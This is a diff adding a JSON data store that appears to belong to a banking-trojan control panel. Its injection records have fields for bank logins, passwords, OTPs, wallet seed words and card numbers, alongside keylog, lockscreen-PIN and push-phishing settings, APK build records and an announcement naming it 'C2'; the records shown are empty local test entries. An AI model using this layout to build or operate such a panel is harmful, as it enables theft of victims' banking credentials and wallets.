@@ -1,0 +1,501 @@
+{
+ "inject_settings": [],
+ "inj_records": [
+  {
+   "ts": 1790968706,
+   "deviceId": "",
+   "bank": "",
+   "step": "1",
+   "account": "",
+   "password": "",
+   "otp": "",
+   "words": "",
+   "lang": "",
+   "cc": "",
+   "from": "127.0.0.1"
+  },
+  {
+   "ts": 1790968709,
+   "deviceId": "",
+   "bank": "",
+   "step": "1",
+   "account": "",
+   "password": "",
+   "otp": "",
+   "words": "",
+   "lang": "",
+   "cc": "",
+   "from": "127.0.0.1"
+  },
+  {
+   "ts": 1790969389,
+   "deviceId": "",
+   "bank": "",
+   "step": "1",
+   "account": "",
+   "password": "",
+   "otp": "",
+   "words": "",
+   "lang": "",
+   "cc": "",
+   "from": "127.0.0.1"
+  },
+  {
+   "ts": 1790969392,
+   "deviceId": "",
+   "bank": "",
+   "step": "1",
+   "account": "",
+   "password": "",
+   "otp": "",
+   "words": "",
+   "lang": "",
+   "cc": "",
+   "from": "127.0.0.1"
+  },
+  {
+   "ts": 1790969961,
+   "deviceId": "",
+   "bank": "",
+   "step": "1",
+   "account": "",
+   "password": "",
+   "otp": "",
+   "words": "",
+   "lang": "",
+   "cc": "",
+   "from": "127.0.0.1"
+  },
+  {
+   "ts": 1790969964,
+   "deviceId": "",
+   "bank": "",
+   "step": "1",
+   "account": "",
+   "password": "",
+   "otp": "",
+   "words": "",
+   "lang": "",
+   "cc": "",
+   "from": "127.0.0.1"
+  },
+  {
+   "ts": 1790969967,
+   "deviceId": "",
+   "bank": "",
+   "step": "1",
+   "account": "",
+   "password": "",
+   "otp": "",
+   "words": "",
+   "lang": "",
+   "cc": "",
+   "from": "127.0.0.1"
+  },
+  {
+   "ts": 1790969970,
+   "deviceId": "",
+   "bank": "",
+   "step": "1",
+   "account": "",
+   "password": "",
+   "otp": "",
+   "words": "",
+   "lang": "",
+   "cc": "",
+   "from": "127.0.0.1"
+  },
+  {
+   "ts": 1790969972,
+   "deviceId": "",
+   "bank": "",
+   "step": "1",
+   "account": "",
+   "password": "",
+   "otp": "",
+   "words": "",
+   "lang": "",
+   "cc": "",
+   "from": "127.0.0.1"
+  },
+  {
+   "ts": 1790969975,
+   "deviceId": "",
+   "bank": "",
+   "step": "1",
+   "account": "",
+   "password": "",
+   "otp": "",
+   "words": "",
+   "lang": "",
+   "cc": "",
+   "from": "127.0.0.1"
+  },
+  {
+   "ts": 1790969990,
+   "deviceId": "",
+   "bank": "",
+   "step": "1",
+   "account": "",
+   "password": "",
+   "otp": "",
+   "words": "",
+   "lang": "",
+   "cc": "",
+   "from": "127.0.0.1"
+  },
+  {
+   "ts": 1790969993,
+   "deviceId": "",
+   "bank": "",
+   "step": "1",
+   "account": "",
+   "password": "",
+   "otp": "",
+   "words": "",
+   "lang": "",
+   "cc": "",
+   "from": "127.0.0.1"
+  },
+  {
+   "ts": 1790969995,
+   "deviceId": "",
+   "bank": "",
+   "step": "1",
+   "account": "",
+   "password": "",
+   "otp": "",
+   "words": "",
+   "lang": "",
+   "cc": "",
+   "from": "127.0.0.1"
+  },
+  {
+   "ts": 1790969998,
+   "deviceId": "",
+   "bank": "",
+   "step": "1",
+   "account": "",
+   "password": "",
+   "otp": "",
+   "words": "",
+   "lang": "",
+   "cc": "",
+   "from": "127.0.0.1"
+  },
+  {
+   "ts": 1790970001,
+   "deviceId": "",
+   "bank": "",
+   "step": "1",
+   "account": "",
+   "password": "",
+   "otp": "",
+   "words": "",
+   "lang": "",
+   "cc": "",
+   "from": "127.0.0.1"
+  },
+  {
+   "ts": 1790970004,
+   "deviceId": "1",
+   "bank": "",
+   "step": "1",
+   "account": "",
+   "password": "",
+   "otp": "",
+   "words": "",
+   "lang": "",
+   "cc": "",
+   "from": "127.0.0.1"
+  }
+ ],
+ "inj_track": {},
+ "keylogs": [],
+ "lockscreen": {
+  "enabled": false,
+  "title": "",
+  "disclaimer": "",
+  "pin_length": 6,
+  "langs": []
+ },
+ "push_config": {
+  "enabled": false,
+  "title": "",
+  "body": "",
+  "url": ""
+ },
+ "banners": [],
+ "memos": [],
+ "groups": [],
+ "blacklist": [],
+ "notes": {},
+ "marks": {},
+ "pins": {},
+ "users": [
+  {
+   "username": "admin",
+   "role": "admin",
+   "apkId": "10020",
+   "childUsers": [],
+   "created": 0
+  }
+ ],
+ "audit": [
+  {
+   "ts": 1790926522,
+   "actor": "admin",
+   "action": "icon_upload",
+   "detail": "icon_9e60ddbb_1790926522.png 117799B"
+  },
+  {
+   "ts": 1790926533,
+   "actor": "admin",
+   "action": "build",
+   "detail": "84612887"
+  },
+  {
+   "ts": 1790929116,
+   "actor": "admin",
+   "action": "icon_upload",
+   "detail": "icon_a8f57638_1790929116.png 80732B"
+  },
+  {
+   "ts": 1790929124,
+   "actor": "admin",
+   "action": "build",
+   "detail": "81415fc9"
+  },
+  {
+   "ts": 1790929671,
+   "actor": "admin",
+   "action": "icon_upload",
+   "detail": "icon_f86ee78b_1790929671.png 80732B"
+  },
+  {
+   "ts": 1790929677,
+   "actor": "admin",
+   "action": "build",
+   "detail": "d1fcd8fe"
+  }
+ ],
+ "transfers": [],
+ "builds": [
+  {
+   "id": "84612887",
+   "ts": 1790926533,
+   "status": "queued",
+   "apkId": "10020",
+   "profile": "default",
+   "note": "不出包"
+  },
+  {
+   "id": "81415fc9",
+   "ts": 1790929124,
+   "status": "queued",
+   "apkId": "10020",
+   "profile": "default",
+   "note": "不出包"
+  },
+  {
+   "id": "d1fcd8fe",
+   "buildId": "d1fcd8fe",
+   "ts": 1790929677,
+   "status": "done",
+   "apkId": "10020",
+   "profile": "default",
+   "appName": "3213",
+   "buildType": "1.0",
+   "apkPath": "/dl/labagent.apk",
+   "note": "构建完成，2971 字节 (sha256: d72d8631326d40af)"
+  }
+ ],
+ "build_profiles": [
+  {
+   "id": "default",
+   "name": "默认构建",
+   "apkId": "10020",
+   "group": "",
+   "note": ""
+  }
+ ],
+ "ai_config": {
+  "enabled": false,
+  "provider": "none",
+  "model": "",
+  "note": "默认关闭（fail-safe）"
+ },
+ "ai_tasks": [],
+ "translate_config": {
+  "enabled": false,
+  "from": "zh",
+  "to": "en"
+ },
+ "bank_cards": [],
+ "cache": {},
+ "setup_history": [],
+ "clean_log": [],
+ "licenses": [],
+ "tg": {
+  "bound": false,
+  "chat_id": ""
+ },
+ "list_load_settings": {
+  "enabled": false,
+  "threshold": 3
+ },
+ "announcements": [
+  {
+   "id": "a1",
+   "ts": 0,
+   "title": "本地实现就绪",
+   "body": "C2"
+  }
+ ],
+ "daily_report": {},
+ "argv": {},
+ "flags": {
+  "ws_tickets": {
+   "19vuUwVVIcpiaFw6d_26cglj6Flrb7dz": {
+    "actor": "admin",
+    "ts": 1790885592
+   },
+   "jsRrwvZ85Kv599hp8WgEKt_4MRjz92AB": {
+    "actor": "admin",
+    "ts": 1790885615
+   },
+   "zMlTOLzD6m6JMDMIvFWjudZ5RuXhATc1": {
+    "actor": "admin",
+    "ts": 1790885615
+   },
+   "22fnkwHyyrk7Q48tlct_3yOD8R9zh_bF": {
+    "actor": "admin",
+    "ts": 1790886117
+   },
+   "j9jdXjdBEq1UA0S7XZ4kpEaXixHZatqD": {
+    "actor": "admin",
+    "ts": 1790886117
+   },
+   "1FCsQKe_BijEqYMQvqqxbBU-Lg7mTmB9": {
+    "actor": "admin",
+    "ts": 1790886251
+   },
+   "y7tyK3aJzzS_o4Y4jGiAmGOYGqdHXcyp": {
+    "actor": "admin",
+    "ts": 1790886316
+   },
+   "Dy3JgyRDxudrbYgXOs5aieecwtJaP4Uo": {
+    "actor": "admin",
+    "ts": 1790925935
+   },
+   "nu0Dr-B_btHAhk_XO_neBSVKizWIqBlg": {
+    "actor": "admin",
+    "ts": 1790926285
+   },
+   "xSBQMnmxRmUBxkD0TmpgFN67-WX7hamw": {
+    "actor": "admin",
+    "ts": 1790926471
+   },
+   "ZweWsqiu-YNNb0KHCy44gdtK3SuiPvZ6": {
+    "actor": "admin",
+    "ts": 1790926566
+   },
+   "HsA0coTiH8YfzKwzFuK28vB4HKpFBhk-": {
+    "actor": "admin",
+    "ts": 1790926596
+   },
+   "NDZ_h8MsjCGICSvwZLeQA8ZnVFyRmbTL": {
+    "actor": "admin",
+    "ts": 1790926601
+   },
+   "kj-dmQnBb-oZnUKaNKivWIW99N85ScJv": {
+    "actor": "admin",
+    "ts": 1790926722
+   },
+   "yqS9Q9cFXzxIu6dhR4IEfZ0TLHfbc-BU": {
+    "actor": "admin",
+    "ts": 1790927808
+   },
+   "_z3pY4yOR_7wrAVscvkzA1o1jIdoLmHq": {
+    "actor": "admin",
+    "ts": 1790927902
+   },
+   "UwzqITq54AaAUF4pUfkRuztDQeoVwph5": {
+    "actor": "admin",
+    "ts": 1790928066
+   },
+   "Nog-ET53jXjuTzCvqU9VBKiC2L0_l7G1": {
+    "actor": "admin",
+    "ts": 1790928069
+   },
+   "41tPvABa0AE3AaEFLfC5hFR7zO2NklA8": {
+    "actor": "admin",
+    "ts": 1790929063
+   },
+   "EBGbrzhMTLnZu-Ikpyf5pjTyTLZxWt0a": {
+    "actor": "admin",
+    "ts": 1790929077
+   },
+   "d8QBCo8imwze80YmY2HpWSIBxYwZcw7J": {
+    "actor": "admin",
+    "ts": 1790929104
+   },
+   "5Ejtget1BAwF9cNiyKmpHb173pNxaZJl": {
+    "actor": "admin",
+    "ts": 1790929177
+   },
+   "pgbOOYIlXrCCN0PGvDvjb_9bbHvwaZsf": {
+    "actor": "admin",
+    "ts": 1790929309
+   },
+   "P_yaWHZoLek6zxySybSfE-Lg9tUglxrM": {
+    "actor": "admin",
+    "ts": 1790929359
+   },
+   "l1PVcDkMid9aBm9WQEtyk8E1AUWv_xU_": {
+    "actor": "admin",
+    "ts": 1790929621
+   },
+   "tDRvN8nnT5b1o8GDMkGfTkxjc56zBSTZ": {
+    "actor": "admin",
+    "ts": 1790929654
+   },
+   "WuMMnZt5CkP1SVGCK3IGqVBu2ks3DCdK": {
+    "actor": "admin",
+    "ts": 1790931703
+   },
+   "-yx7zIpOHQjgPdKBVbRKl-mtmR4V4igU": {
+    "actor": "admin",
+    "ts": 1790931709
+   },
+   "GvAmyhJPyDCJeagrk5kFcxXskVc-9yiO": {
+    "actor": "admin",
+    "ts": 1790932922
+   },
+   "ucS2osLH3_nIB45jmqabGKGTxc34Y3m-": {
+    "actor": "admin",
+    "ts": 1790934452
+   },
+   "3r4atzVtIiDSWQFnjl9bqV2UFskEtn3O": {
+    "actor": "admin",
+    "ts": 1790935315
+   },
+   "uuv110naehMm-wwpCR_uVVFWSHBjuroE": {
+    "actor": "admin",
+    "ts": 1791015676
+   }
+  }
+ },
+ "misc": {},
+ "relay_intel": [],
+ "relay_users": [
+  {
+   "usrname": "seops",
+   "email": "seops@local",
+   "authorty": "admin",
+   "expire_date": "2099-12-31",
+   "pw": "8a161c3a9e466a4d$238ebf78a77e6b0a778290bcb81d56fb2b23973e3a4b1efef4957c9233e49a31",
+   "created": 1791016014
+  }
+ ]
+}
